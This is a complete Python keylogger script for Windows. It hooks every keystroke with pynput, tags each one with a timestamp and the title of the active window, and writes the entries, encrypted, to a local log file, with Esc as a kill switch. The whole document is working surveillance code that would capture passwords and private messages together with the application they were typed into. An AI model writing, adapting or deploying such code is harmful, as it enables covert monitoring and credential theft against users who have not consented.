import os
import json
import psutil
import datetime
import win32gui
from pynput import keyboard
from cryptography.fernet import Fernet

key_file = "key.key"
if not os.path.exists(key_file):
    with open(key_file, "wb") as f:
        f.write(Fernet.generate_key())
with open(key_file, "rb") as f:
    cipher = Fernet(f.read())

log_file = "logs.enc"

def get_active_window():
    try:
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        return window if window else "unknown"
    except:
        return "unknown"

def on_press(key):
    try:
        k = key.char if hasattr(key, 'char') else str(key)
    except:
        k = str(key)

    entry = {
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "process": psutil.Process(os.getpid()).name(),
        "window": get_active_window(),
        "key": k
    }

    with open(log_file, "ab") as f:
        f.write(cipher.encrypt(json.dumps(entry).encode()) + b"\n")

    if key == keyboard.Key.esc: # kill switch
        return False

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
